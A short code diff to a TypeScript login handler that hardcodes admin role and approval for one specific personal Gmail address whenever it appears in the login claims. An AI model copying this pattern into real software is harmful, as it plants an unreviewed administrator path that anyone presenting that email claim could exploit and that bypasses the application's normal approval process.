@@ -42,13 +42,21 @@ function updateUserSession(
 async function upsertUser(
   claims: any,
 ) {
-  await storage.upsertUser({
+  const userData = {
     id: claims["sub"],
     email: claims["email"],
     firstName: claims["first_name"],
     lastName: claims["last_name"],
     profileImageUrl: claims["profile_image_url"],
-  });
+  };
+
+  // Grant immediate admin access to tamzid257@gmail.com
+  if (claims["email"] === 'tamzid257@gmail.com') {
+    userData.role = 'admin';
+    userData.isApproved = true;
+  }
+
+  await storage.upsertUser(userData);
 }
 
 export async function setupAuth(app: Express) {
